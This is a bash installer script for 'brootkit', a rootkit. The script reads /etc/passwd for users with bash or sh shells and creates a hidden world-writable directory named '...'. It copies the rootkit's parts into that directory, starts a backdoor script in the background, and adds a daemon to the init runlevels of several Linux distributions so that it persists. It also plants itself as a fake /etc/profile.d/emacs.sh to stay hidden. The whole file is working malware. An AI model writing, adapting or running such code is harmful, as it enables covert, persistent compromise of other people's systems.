#!/bin/bash

BR_ROOTKIT_PATH="/usr/include/..."

declare br_os_type=0
declare br_privilege=1
declare -a br_shell=()
declare br_shell_idx=0
declare -a br_user=()

function br_install_rootkit()
{
	cp brootkit.sh /etc/profile.d/emacs.sh
	#touch -r /etc/profile.d/vim.sh /etc/profile.d/emacs.sh
}

function br_hookhup()
{
        :
}

function br_check_shell()
{
	local idx line user shell

	while read line
	do
		user=`echo $line | cut -d ":" -f 1`
		shell=`echo $line | cut -d ":" -f 7`

		if [ "$shell" == "/bin/bash" -o "$shell" == "/bin/sh" ]; then
			br_user[br_shell_idx]=$user
			br_shell[br_shell_idx]=$shell
			((br_shell_idx++))
		fi
	done < /etc/passwd

	[ ${#br_user} -eq 0 ] && echo "no users has bash/sh environment." && exit

	for ((idx = 0; idx < $br_shell_idx; idx++))
	do
		echo "detect user - ${br_user[$idx]} has ${br_shell[$idx]} evnironment."
	done
}

function br_check_privilege()
{
	[ $UID -eq 0 -o $EUID -eq 0 ] && br_privilege=0 || br_privilege=1
}

function br_set_rootkit_path()
{
	if [ $br_privilege -eq 1 ]; then
		BR_ROOTKIT_PATH="/home/$USER/..."
	else
		echo "install brootkit using root privilege."
	fi
}

function br_check_os_type()
{
	local line

	line=`head -n 1 /etc/issue`
	if echo $line|grep "[Cc]ent[Oo][Ss]" >/dev/null; then
		br_os_type=1
	elif echo $line|grep "[Rr]ed.Hat.Enterprise" >/dev/null; then
		br_os_type=2
	elif echo $line|grep "[Uu]buntu" >/dev/null; then
		br_os_type=3
	elif echo $line|grep "[Dd]ebian" >/dev/null; then
		br_os_type=4
	elif echo $line|grep "[Ff]edora" >/dev/null; then
		br_os_type=5
	else
		echo -e "target os type - $line is not supported."
		exit 0
	fi

	echo -e "target os type - $line"
	#echo $br_os_type
}

function br_centos_install()
{
	local idx

	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
	for idx in 0 1 2 3 4 5 6
	do
		ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc$idx.d/S10brdaemon
		[ $? -eq 1 ] && echo "copy brdaemon $idx failed." && exit
	done
}

function br_ubuntu_install()
{
	local idx

	cp brdaemon.sh /etc/init.d/brdaemon
	for idx in 0 1 2 3 4 5 6
	do
		ln -s /etc/init.d/brdaemon /etc/rc$idx.d/S10brdaemon
		[ $? -eq 1 ] && echo "copy brdaemon $idx failed." && exit
	done
	ln -s /etc/init.d/brdaemon /etc/rcS.d/S10brdaemon
}

function br_debian_install()
{
	cp brdaemon.sh /etc/init.d/brdaemon
	update-rc.d -f brdaemon start 20 2 3 4 5
}

function br_fedora_install()
{
        local idx

        cp brdaemon.sh /etc/rc.d/init.d/brdaemon
        for idx in 0 1 2 3 4 5 6
        do
                ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc$idx.d/S10brdaemon
                [ $? -eq 1 ] && echo "copy brdaemon $idx failed." && exit
        done
}

function br_creat_home()
{
	mkdir -p $BR_ROOTKIT_PATH -m 0777
	[ $? -eq 1 ] && echo "mkdir $BR_ROOTKIT_PATH failed." && exit

	cp brootkit.sh br.conf brconfig.sh bashbd.sh brscan.sh $BR_ROOTKIT_PATH
	[ $? -eq 1 ] && echo "copy brootkit failed." && exit

	chmod 777 $BR_ROOTKIT_PATH
}

function br_install_backdoor()
{
        if ! type nohup >/dev/null; then
                nohup $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1
		[ $? -eq 1 ] && echo "install backdoor failed." && exit
        else
                trap br_hookhup SIGHUP
                $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1 &
		[ $? -eq 1 ] && echo "install backdoor failed." && exit
        fi
}

function main()
{
	br_check_os_type
	br_check_shell
	br_check_privilege
	br_set_rootkit_path
	br_creat_home
	br_install_backdoor

	if [ $br_privilege -eq 0 ]; then
		case $br_os_type in
			1|2)
				br_centos_install ;;
			3)
				br_ubuntu_install ;;
			4)
				br_debian_install ;;
			5)
				br_fedora_install ;;
		esac
		br_install_rootkit
	fi

	if [ $? -eq 1 ]; then
		echo "install brootkit failed."
		exit
	else
		echo "install brootkit successful."
	fi
}

main
